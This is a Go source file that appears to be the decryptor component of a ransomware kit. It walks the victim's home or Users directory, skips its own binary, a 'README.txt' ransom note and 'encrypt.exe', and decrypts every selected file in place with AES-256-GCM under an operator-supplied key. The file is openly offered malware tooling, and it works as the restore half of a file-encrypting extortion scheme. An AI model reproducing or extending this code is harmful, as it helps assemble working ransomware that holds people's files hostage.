package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"runtime"
)

func DecodeKey(encKey string) *[32]byte {
	key := [32]byte{}
	dKey, err := hex.DecodeString(encKey)
	if err != nil {
		panic(err)
	}
	copy(key[:], dKey)
	return &key
}

// Decrypt decrypts data using 256-bit AES-GCM.  This both hides the content of
// the data and provides a check that it hasn't been altered. Expects input
// form nonce|ciphertext|tag where '|' indicates concatenation.
func Decrypt(ciphertext []byte, key *[32]byte) (plaintext []byte, err error) {
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	if len(ciphertext) < gcm.NonceSize() {
		return nil, errors.New("malformed ciphertext")
	}

	return gcm.Open(nil,
		ciphertext[:gcm.NonceSize()],
		ciphertext[gcm.NonceSize():],
		nil,
	)
}

func visit(files *[]string) filepath.WalkFunc {
	return func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if info.IsDir() {
			return nil
		}
		ex, err := os.Executable()
		if err != nil {
			panic(err)
		}
		if path == ex {
			return nil
		}
		if filepath.Base(path) == "README.txt" {
			return nil
		}
		if filepath.Base(path) == "encrypt.exe" {
			return nil
		}
		if info.Mode().Perm()&(1<<(uint(7))) == 0 {
			return nil
		}

		*files = append(*files, path)
		return nil
	}
}

var key string = "" // your aes key (in hex)

func main() {
	var files []string
	var counter int = 0
	var home string

	decryptionKey := DecodeKey(key)

	if runtime.GOOS == "windows" {
		home = os.Getenv("HOMEDRIVE") + "\\Users\\"
		if home == "" {
			home = os.Getenv("USERPROFILE")
		}
	} else {
		home = os.Getenv("HOME")
	}

	err := filepath.Walk(home, visit(&files))
	if err != nil {
		panic(err)
	}
	for _, file := range files {
		counter++
		fmt.Printf("\rDecrypting %d/%d: %s", counter, len(files), file)

		data, err := ioutil.ReadFile(file)
		if err != nil {
			continue
		}

		decrypted, err := Decrypt(data, decryptionKey)
		if err != nil {
			log.Println(err)
			continue
		}

		err = ioutil.WriteFile(file, decrypted, 0644)
		if err != nil {
			continue
		}
	}
	fmt.Printf("\n%d files decrypted.\n", len(files))
}
